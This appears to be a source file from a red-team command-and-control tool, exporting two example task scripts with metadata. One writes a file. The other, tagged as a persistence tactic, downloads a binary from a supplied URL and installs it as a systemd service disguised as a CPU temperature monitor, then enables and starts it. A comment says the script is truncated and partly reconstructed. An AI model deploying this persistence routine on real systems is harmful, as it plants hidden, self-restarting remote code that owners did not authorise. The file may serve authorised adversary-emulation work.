export const FILE_WRITE_EXAMPLE = {
    metadata: `name: Write File
description: Write the given utf-8 content to a file
author: cictrone
support_model: FIRST_PARTY
tactic: EXECUTION
paramdefs:
- name: path
  type: string
  label: File path
  placeholder: "/tmp/cat.txt"
- name: content
  type: string
  label: Content to write
  placeholder: "meow"
`,
    script: `
def main():
    new_file_path = input_params['path']
    new_file_parent_dir = file.parent_dir(new_file_path)
    new_file_content = input_params['content']

    # if file parent directory does not exist, error and exit.
    if not file.exists(new_file_parent_dir):
        eprint(
            f"[ERROR] Parent Directory for File does not exist at path: '{new_file_path}'.")
        eprint(f"[ERROR] Exiting...")
        return

    # if file exists, remove it.
    if file.exists(new_file_path):
        print(
            "[INFO] File was detected at the path before write. Trying to remove the file...")
        file.remove(new_file_path)
        print("[INFO] File was successfully removed!")

    # if unable to write to destination will error
    file.write(new_file_path, new_file_content)

    # Print a Success!
    print(f"[INFO] The file '{new_file_path}' was successfully written!")


main()
`
};

export const PERSIST_SERVICE_EXAMPLE = {
    metadata: `name: Create Service
description: Create a service for a specific binary
author: hulto
support_model: FIRST_PARTY
tactic: PERSISTENCE
paramdefs:
- name: executable_url
  type: string
  label: Executable URL
  placeholder: https://example.com/executable_path
- name: service_name
  type: string
  label: Service name
  placeholder: cpu-tempd
- name: service_desc
  type: string
  label: Service description
  placeholder: CPU Temperature monitoring service
- name: executable_name
  type: string
  label: Executable name
  placeholder: cpud
`,
    script: `
# (Truncated for brevity, but full content from persist_service/main.eldritch would go here in practice)
# For this example file, I will include the key parts showing templates and logic structure.

systemd_service_template = """[Unit]
Description={{ SERVICE_DESC }}
Requires=network.target
After=network.target

[Service]
Type=simple
{% if SERVICE_WORKING_DIR is defined %}
WorkingDirectory={{ SERVICE_WORKING_DIR }}
{% endif %}
ExecStart={{ SERVICE_START_CMD }}

[Install]
WantedBy=multi-user.target
"""

def is_using_systemd():
    command_get_res = sys.shell("command -v systemctl")
    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
        return True
    return False

def systemd(service_name, service_desc, executable_path, executable_url):
    file.write("/tmp/systemd.service.j2", systemd_service_template)
    args = {
        "SERVICE_NAME":service_name,
        "SERVICE_DESC":service_desc,
        "SERVICE_START_CMD":executable_path
    }
    file.template("/tmp/systemd.service.j2","/usr/lib/systemd/system/"+service_name+".service", args, False)
    file.remove("/tmp/systemd.service.j2")

    http.download(executable_url, executable_path)
    sys.shell("chmod +x "+executable_path)

    sys.shell("systemctl daemon-reload")
    sys.shell("systemctl enable "+service_name)
    sys.shell("systemctl start "+service_name)

def main():
    if sys.is_linux():
        executable_path = "/usr/local/bin/" + input_params['executable_name']
        if is_using_systemd():
             systemd(input_params['service_name'], input_params['service_desc'], executable_path, input_params['executable_url'])
    else:
        print("OS not supported")

main()
`
};
